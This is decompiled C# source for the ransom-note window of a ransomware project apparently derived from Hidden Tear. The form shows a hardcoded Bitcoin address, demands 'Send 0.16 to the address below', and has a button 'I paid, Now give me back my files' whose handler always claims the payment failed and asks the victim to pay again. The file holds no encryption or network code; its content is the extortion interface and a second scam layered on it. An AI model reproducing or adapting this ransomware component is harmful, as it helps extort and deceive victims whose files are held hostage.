using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using hidden_tear.Properties;

namespace hidden_tear;

public class Form3 : Form
{
	private IContainer components = null;

	private PictureBox pictureBox1;

	private TextBox textBox1;

	private Label label1;

	private Button button1;

	public Form3()
	{
		InitializeComponent();
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Checking Payment.................Please Wait", "Please wait");
		MessageBox.Show("Your Payment has failed, The funs have been sent back to your wallet. Please send it again", "Error");
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_0191: Unknown result type (might be due to invalid IL or missing references)
		//IL_019b: Expected O, but got Unknown
		//IL_0228: Unknown result type (might be due to invalid IL or missing references)
		//IL_0232: Expected O, but got Unknown
		pictureBox1 = new PictureBox();
		textBox1 = new TextBox();
		label1 = new Label();
		button1 = new Button();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		pictureBox1.set_Image((Image)(object)Resources.Bitcoin_Accepted_Here_4800px);
		((Control)pictureBox1).set_Location(new Point(142, 359));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(512, 146));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)textBox1).set_BackColor(Color.Black);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 10.2f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(Color.Red);
		((Control)textBox1).set_Location(new Point(142, 282));
		((Control)textBox1).set_Name("textBox1");
		((TextBoxBase)textBox1).set_ReadOnly(true);
		((Control)textBox1).set_Size(new Size(512, 27));
		((Control)textBox1).set_TabIndex(1);
		((Control)textBox1).set_Text("1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M");
		((Control)textBox1).add_TextChanged((EventHandler)textBox1_TextChanged);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 10.8f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Red);
		((Control)label1).set_Location(new Point(259, 196));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(279, 24));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text("Send 0.16 to the address below.");
		((Control)button1).set_BackColor(Color.Black);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 10.8f));
		((Control)button1).set_ForeColor(Color.Red);
		((Control)button1).set_Location(new Point(263, 86));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(275, 75));
		((Control)button1).set_TabIndex(3);
		((Control)button1).set_Text("I paid, Now give me back my files.");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(797, 536));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form3");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
